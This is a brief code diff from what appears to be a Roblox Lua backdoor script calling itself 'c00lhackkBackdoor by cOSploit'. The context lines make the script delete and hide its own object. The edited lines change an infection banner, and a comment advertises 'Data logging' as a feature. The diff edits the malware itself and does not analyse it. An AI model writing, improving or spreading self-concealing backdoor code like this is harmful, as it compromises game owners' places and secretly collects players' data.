@@ -18,8 +18,7 @@ end
 getfenv().script:Destroy()
 getfenv().script = nil
 
-print([[-- Infected with c00lhackkBackdoor by cOSploit
--- Best Scripter Right
+print("[[-- Infected with c00lhackkBackdoor by cOSploit --]]")
 
 -- Features we have:
 -- -- Data logging
